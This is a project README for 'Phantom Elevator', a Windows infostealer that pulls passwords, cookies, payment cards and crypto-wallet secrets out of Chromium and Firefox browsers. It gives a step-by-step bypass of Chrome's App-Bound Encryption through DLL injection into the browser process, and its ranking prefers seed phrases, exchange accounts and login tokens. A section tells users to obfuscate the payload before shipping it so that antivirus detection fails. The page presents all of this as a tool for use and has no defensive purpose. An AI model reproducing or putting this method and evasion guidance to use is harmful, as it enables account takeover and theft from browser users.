<div align="center">

# 👻 PHANTOM ELEVATOR

**Multi-browser credential extraction for the post–App-Bound-Encryption era.**

<br>

[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Windows 10 · 11](https://img.shields.io/badge/windows-10%20%7C%2011%20x64-0078D6?style=for-the-badge&logo=windows11&logoColor=white)](#)
[![ABE](https://img.shields.io/badge/app--bound%20encryption-bypassed-e11d48?style=for-the-badge)](#-03--the-abe-problem)
[![v1.0.0](https://img.shields.io/badge/version-1.0.0-8a2be2?style=for-the-badge)](#)

<br>

`Chrome 127+ wrapped its keys in App-Bound Encryption.` **`Phantom Elevator unwraps them anyway.`**

<br>

**13 BROWSER FAMILIES** &nbsp;·&nbsp; **DPAPI + v20 BYPASS** &nbsp;·&nbsp; **SIGNAL-FIRST FILTERING** &nbsp;·&nbsp; **OBFUSCATION-READY**

<br>

[**Quickstart**](#-05--quickstart) · [**Browsers**](#-04--supported-browsers) · [**Bypass**](#-03--the-abe-problem) · [**Obfuscation**](#-06--hardening-the-payload) · [**Limitations**](#-08--limitations)

</div>

<br>

> **The problem.** Since Chrome 127, the master key is no longer protected by DPAPI alone.
>
> **The answer.** Borrow the browser's own elevation service, ask it to decrypt, and walk away with the key.

<br>

---

## `01 ·` MISSION

**Phantom Elevator** is a Windows credential extractor built for the post-ABE era. It walks Chromium and Firefox profile directories, locates every encrypted secret store, and recovers the plaintext — including the **v20 App-Bound Encryption** keys that broke every legacy DPAPI-only extractor.

It is a single-file Python application. No service to install. No driver to sign. No agent to persist.

Point it at a machine. Let it detect what is installed. Read the output.

<br>

<table>
<tr>
<td width="33%" valign="top">

### 🎯 Detect
Enumerates Chromium and Firefox families from standard install paths. Missing browsers are skipped, not fatal.

</td>
<td width="33%" valign="top">

### 🔓 Recover
Resolves each browser's key store — `v10` via DPAPI, `v20` via an in-process elevation bridge compiled at runtime.

</td>
<td width="33%" valign="top">

### 📊 Rank
Scores every local-storage entry before writing. Wallets, tokens, and seed phrases lead the output.

</td>
</tr>
</table>

<br>

---

## `02 ·` THE CHAIN THAT BROKE

For years, credential tooling relied on one chain:

```text
Local State  →  encrypted_key (v10)  →  CryptUnprotectData  →  AES-256-GCM  →  plaintext
```

That chain still works — for `v10`.

Chrome 127 introduced **App-Bound Encryption**. The master key is now sealed inside a COM elevation service that only the browser's own signed process is supposed to reach. DPAPI returns ciphertext. The old chain dead-ends.

<br>

---

## `03 ·` THE ABE PROBLEM

Phantom Elevator adds the missing bridge.

```text
Local State  →  encrypted_key (v20)  →  elevation-service bridge  →  master key  →  AES-256-GCM  →  plaintext
```

<br>

<details open>
<summary><b>⚡ The bypass, step by step</b></summary>

<br>

```text
phantom_elevator.py
        │
        ├─ 01. Parse Local State → os_crypt.encrypted_key
        │
        ├─ 02. Compile a tiny C DLL
        │        CLSID + IID + vtable offset for the target browser
        │
        ├─ 03. Launch chrome.exe --version in a sandboxed TEMP
        │
        ├─ 04. OpenProcess → VirtualAllocEx → WriteProcessMemory
        │        → CreateRemoteThread(LoadLibraryW)
        │
        ├─ 05. DLL: CoCreateInstance(ElevationService, CLSCTX_LOCAL_SERVER)
        │        → vtable decrypt slot
        │        → plaintext key written to temp file
        │
        └─ 06. Python reads the key → AES-256-GCM decrypts
                 cookies · passwords · cards · tokens
```

</details>

<br>

Each supported Chromium build ships its own `CLSID`, `IID_V1` / `IID_V2`, elevation service name, and vtable offset — all carried in the browser table. The DLL is compiled at runtime with MinGW-w64 `gcc` or MSVC `cl`. If no compiler is present, the ABE path disables itself and `v10` extraction continues.

<br>

---

## `04 ·` SUPPORTED BROWSERS

### Chromium family

| | Browser | Key protection | ABE bridge |
|:---|:---|:---|:---:|
| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=16" height="14"> | **Google Chrome** | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=google.com&sz=16" height="14"> | Chrome Beta | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=brave.com&sz=16" height="14"> | **Brave** | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=microsoft.com&sz=16" height="14"> | Microsoft Edge | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=avast.com&sz=16" height="14"> | Avast Secure Browser | DPAPI + ABE | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=vivaldi.com&sz=16" height="14"> | Vivaldi | DPAPI | — |
| <img src="https://www.google.com/s2/favicons?domain=chromium.org&sz=16" height="14"> | Chromium | DPAPI | — |
| <img src="https://www.google.com/s2/favicons?domain=opera.com&sz=16" height="14"> | Opera | DPAPI | — |

### Firefox family

| | Browser | Key protection | Status |
|:---|:---|:---|:---:|
| <img src="https://www.google.com/s2/favicons?domain=mozilla.org&sz=16" height="14"> | **Firefox** | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=waterfox.net&sz=16" height="14"> | Waterfox | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=librewolf.net&sz=16" height="14"> | LibreWolf | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=floorp.app&sz=16" height="14"> | Floorp | NSS / `key4.db` | ✅ |
| <img src="https://www.google.com/s2/favicons?domain=zen-browser.app&sz=16" height="14"> | Zen Browser | NSS / `key4.db` | ✅ |

<sub>Installation is detected automatically from standard `%LocalAppData%` and `%ProgramFiles%` paths. Missing browsers are skipped, not fatal.</sub>

<br>

---

## `04.1 ·` EXTRACTION MATRIX

<table>
<tr>
<th></th>
<th align="left">Category</th>
<th align="left">Chromium source</th>
<th align="left">Firefox source</th>
</tr>
<tr><td>🍪</td><td><b>Cookies</b></td><td><code>Network/Cookies</code></td><td><code>cookies.sqlite</code></td></tr>
<tr><td>🔑</td><td><b>Passwords</b></td><td><code>Login Data</code></td><td><code>logins.json</code></td></tr>
<tr><td>📜</td><td>History</td><td><code>History</code></td><td><code>places.sqlite</code></td></tr>
<tr><td>📝</td><td>Autofill</td><td><code>Web Data</code></td><td><code>formhistory.sqlite</code></td></tr>
<tr><td>💳</td><td><b>Cards</b></td><td><code>Web Data</code></td><td>—</td></tr>
<tr><td>🗂️</td><td>Local Storage</td><td><code>Local Storage/leveldb</code></td><td><code>storage/default</code></td></tr>
<tr><td>🔖</td><td>Bookmarks</td><td><code>Bookmarks</code></td><td><code>places.sqlite</code></td></tr>
<tr><td>🧩</td><td>Extensions</td><td><code>Extensions/</code></td><td><code>extensions/</code></td></tr>
<tr><td>🪙</td><td><b>Crypto Wallets</b></td><td>extension storage</td><td>extension storage</td></tr>
</table>

<sub>Every category is optional. Run a single target or the full set.</sub>

<br>

---

## `04.2 ·` SIGNAL-FIRST FILTERING

> A raw dump is noise. Phantom Elevator scores local-storage entries before it writes them — the output leads with what actually matters.

**High-value hosts** — wallets, exchanges, identity providers, developer platforms:

```text
MetaMask · Phantom · Coinbase · Binance · Kraken · OKX · KuCoin · Bybit
Uniswap · Aave · OpenSea · WalletConnect · Ledger · Trezor · Trust Wallet
accounts.google.com · login.microsoftonline.com · github.com · gitlab.com
Auth0 · Okta · Discord · Slack
```

**High-value keys** — `token` `jwt` `session` `auth` `api_key` `secret` `password` `private_key` `seed` `mnemonic` `wallet` `keystore` `signer` `phrase`

**High-value values** — seed phrases · `0x` private keys · Bech32 `bc1…` addresses · base58 Bitcoin addresses

The result is a ranked set instead of a haystack.

<br>

---

## `05 ·` QUICKSTART

<table>
<tr>
<td width="33%" align="center">

### ① Clone

```bash
git clone https://github.com/\
Hidden-Rhythm/abe-bypass.git
cd abe-bypass
```

</td>
<td width="33%" align="center">

### ② Run

```bash
python phantom_elevator.py
```

</td>
<td width="33%" align="center">

### ③ Read

```text
cookies.txt
passwords.tsv
local_storage.json
```

</td>
</tr>
</table>

<br>

The tool prints a banner, detects installed browsers, bootstraps missing packages, compiles the ABE bridge when needed, and walks each profile. Progress is reported per browser and per category.

```bash
python phantom_elevator.py --help
```

<sub>For non-interactive runs and output-path control, use the argument surface exposed by <code>argparse</code>.</sub>

<br>

<details>
<summary><b>📦 Requirements</b></summary>

<br>

| Requirement | Detail |
|:---|:---|
| **OS** | Windows 10 / 11, x64 |
| **Python** | 3.10 or later |
| **Compiler** | MinGW-w64 `gcc` or MSVC `cl` — optional; enables the ABE / v20 path |
| **Network** | First run only, for dependency bootstrap |

Dependencies resolve automatically on launch:

- `pycryptodome` — AES-256-GCM
- `python-snappy` — LevelDB block decompression
- `gcc` — attempted via `winget`, `choco`, then `scoop`

If no compiler can be installed, the tool prints a warning and continues in `v10`-only mode.

</details>

<br>

<details>
<summary><b>🗂 Output artifacts</b></summary>

<br>

| Artifact | Format | Notes |
|:---|:---|:---|
| `cookies.txt` | Netscape | import-ready |
| `passwords.tsv` | TSV | `url · user · password` |
| `history.csv` | CSV | timestamped |
| `autofill.csv` | CSV | field / value |
| `cards.csv` | CSV | masked in console |
| `local_storage.json` | JSON | ranked by signal score |
| `bookmarks.json` | JSON | folder tree preserved |
| `extensions.json` | JSON | ID, name, version, path |

Outputs land beside the script unless an alternate path is supplied. Temporary injection artifacts are written to a per-run sandbox under `TEMP` and are not reused across runs.

</details>

<br>

---

## `06 ·` HARDENING THE PAYLOAD

> **Obfuscate before you ship.** Phantom Elevator is a single-file Python application — a drop-in target for the [**Hidden-Rhythm obfuscator**](https://github.com/Hidden-Rhythm/obfuscator) pipeline.

```text
phantom_elevator.py
        │
        ▼
┌──────────────────────────┐
│ 01. Read Source          │
└────────────┬─────────────┘
             ▼
┌──────────────────────────┐
│ 02. Encrypt Constants    │   XOR
└────────────┬─────────────┘
             ▼
┌──────────────────────────┐
│ 03. Build Payload        │   marshal + zlib
└────────────┬─────────────┘
             ▼
┌──────────────────────────┐
│ 04. Build Stage 2        │   base64 chunks
└────────────┬─────────────┘
             ▼
┌──────────────────────────┐
│ 05. Build Bootstrap      │   loader
└────────────┬─────────────┘
             ▼
┌──────────────────────────┐
│ 06. Emit Surface         │   generated identifiers
└────────────┬─────────────┘
             ▼
┌──────────────────────────┐
│ 07. Verify Syntax        │
└────────────┬─────────────┘
             ▼
┌──────────────────────────┐
│ 08. Write Output         │   phantom_elevator_obf.py
└──────────────────────────┘
```

### Run it

```bash
git clone https://github.com/Hidden-Rhythm/obfuscator.git
cd obfuscator
python -m pip install rich
python obfuscator.py
```

When prompted, provide the path to `phantom_elevator.py`. Accept the default output name, `phantom_elevator_obf.py`.

<br>

<table>
<tr>
<th align="left">Layer</th>
<th align="left">Effect</th>
</tr>
<tr><td><b>AST transformation</b></td><td>restructures eligible syntax-tree nodes</td></tr>
<tr><td><b>Constant encoding</b></td><td>XOR-encodes strings and byte constants</td></tr>
<tr><td><b>Payload serialization</b></td><td>compiles to a <code>marshal</code> code object</td></tr>
<tr><td><b>Compression</b></td><td><code>zlib</code> + base64 chunking</td></tr>
<tr><td><b>Layered loader</b></td><td>bootstrap and runtime-loading stages</td></tr>
<tr><td><b>Generated identifiers</b></td><td>breaks static symbol matching</td></tr>
<tr><td><b>Syntax verification</b></td><td>compiles the output before writing</td></tr>
</table>

<br>

> [!WARNING]
> The generated payload uses `marshal`-serialized code objects, which are Python-version dependent. Build and run on the **same interpreter version**. The obfuscator's runtime environment checks can affect execution in unusual sandboxes — test the generated file before deploying it.

The obfuscator also reports a SHA-256 build fingerprint and per-stage timings, so every hardened build is traceable to its source.

<br>

---

## `07 ·` ARCHITECTURE

```text
┌─────────────────────────────────────────────────────────────┐
│                     PHANTOM ELEVATOR                        │
│                   single-file Python app                    │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Browser discovery                                         │
│        │                                                    │
│        ├── Chromium profiles ──┐                            │
│        └── Firefox profiles ───┤                            │
│                                ▼                            │
│                     Profile walker                          │
│                                │                            │
│              ┌─────────────────┼─────────────────┐          │
│              ▼                 ▼                 ▼          │
│          SQLite reader     LevelDB reader    NSS reader     │
│              │                 │                 │          │
│              └─────────────────┼─────────────────┘          │
│                                ▼                            │
│                     Key recovery layer                      │
│              ┌─────────────────┴─────────────────┐          │
│              ▼                                   ▼          │
│        DPAPI (v10)                        ABE bridge (v20)  │
│        CryptUnprotectData                 COM + DLL inject  │
│              └─────────────────┬─────────────────┘          │
│                                ▼                            │
│                     AES-256-GCM decrypt                     │
│                                │                            │
│                                ▼                            │
│              CSV · JSON · Netscape · TSV output             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

<br>

---

## `07.1 ·` TECHNICAL DETAILS

| Component | Implementation |
|:---|:---|
| Language | Python 3.10+ |
| ABE bridge | C (MinGW-w64 `gcc` / MSVC `cl`) |
| Key unprotection | DPAPI `CryptUnprotectData` + AES-256-GCM |
| ABE access | COM elevation service + DLL injection |
| Injection primitives | `OpenProcess` · `VirtualAllocEx` · `WriteProcessMemory` · `CreateRemoteThread` |
| LevelDB parsing | `python-snappy` |
| Crypto | `pycryptodome` |
| Cookie serialization | Netscape |
| Password serialization | TSV |
| Structured output | CSV · JSON |
| Build fingerprint | SHA-256 (via obfuscator) |

<br>

---

## `08 ·` LIMITATIONS

- **Windows only.** The ABE bridge and DPAPI calls are Win32-specific.
- **ABE is per-build.** Chromium CLSIDs, IIDs, service names, and vtable offsets change across browser releases. The browser table in the script is the source of truth — update it when a target ships a new elevation service.
- **Compiler required for v20.** Without `gcc` or `cl`, the ABE path is disabled. `v10` and Firefox extraction still run.
- **Running browsers may lock stores.** SQLite and LevelDB files can be held open. Close the target browser for the cleanest read, or rely on the tool's retry logic (`DEFAULT_RETRIES = 5`).
- **Antivirus is expected to react.** DLL injection and credential access are high-signal behaviors. The obfuscator layer raises static-analysis cost; it does not make the runtime behavior invisible.
- **Obfuscator output is version-bound.** Generate and execute on the same Python minor version.

<br>

---

## `09 ·` PROJECT STRUCTURE

```text
abe-bypass/
└── phantom_elevator.py
```

The entire application — browser tables, DPAPI layer, ABE compiler, injector, profile walkers, and output writers — lives in one file. No package tree, no build step, no external config.

<br>

---

<div align="center">

### 🔗 LINKS

[**GitHub**](https://github.com/Hidden-Rhythm) &nbsp;·&nbsp;
[**Obfuscator**](https://github.com/Hidden-Rhythm/obfuscator) &nbsp;·&nbsp;
[**Website Pinger**](https://github.com/Hidden-Rhythm/website-pinger) &nbsp;·&nbsp;
**Discord** `hidden_rhythm`

<br>

<sub>👻 &nbsp;<b>Phantom Elevator</b> &nbsp;·&nbsp; v1.0.0 &nbsp;·&nbsp; Built in Python by <b>Hidden-Rhythm</b></sub>

</div>
